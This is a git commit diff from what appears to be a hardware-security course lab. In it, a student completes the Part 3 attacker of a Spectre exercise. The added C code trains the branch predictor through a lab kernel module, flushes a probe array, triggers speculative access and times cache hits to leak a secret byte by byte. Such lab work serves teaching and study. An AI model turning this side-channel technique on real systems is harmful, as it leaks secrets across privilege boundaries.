d5ca3eda82b188c3544c12cf8e7416a1c3af586d
Brenton Lian <brenton.lian@gmail.com>
2026-04-04 20:21:51 -0400

    try dropping part 2 into part 3

--- hwsec-course/lab-spectre/part3-src/attacker-part3.c
+++ hwsec-course/lab-spectre/part3-src/attacker-part3.c
@@ -48,12 +48,55 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // [Part 3]- Fill this in!
         // leaked_byte = ??
 
+        int scores[256] = {0};
+
+        for (int attempt = 0; attempt < 200; attempt++) {
+
+            // 1. TRAIN branch predictor
+            for (int i = 0; i < 50; i++) {
+                call_kernel_part2(kernel_fd, shared_memory, i % 8);
+            }
+
+            // 2. FLUSH probe array
+            for (int i = 0; i < 256; i++) {
+                clflush(shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE);
+            }
+
+            mfence();
+            usleep(5);
+
+            // 3. SPECULATIVE call
+            call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+            // 4. MEASURE
+            for (int i = 0; i < 256; i++) {
+                uint64_t time = time_access(shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE);
+
+                if (time < CACHE_HIT_THRESHOLD) {
+                    scores[i]+= 3;
+                }
+            }
+        }
+
+        // pick best guess
+        int best_index = 0;
+        for (int i = 1; i < 256; i++) {
+            if (scores[i] > scores[best_index]) {
+                best_index = i;
+            }
+        }
+
+        leaked_byte = (char)best_index;
+
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
+            leaked_str[current_offset] = '\0';
             break;
         }
+        
     }
 
+    leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
 
     close(kernel_fd);
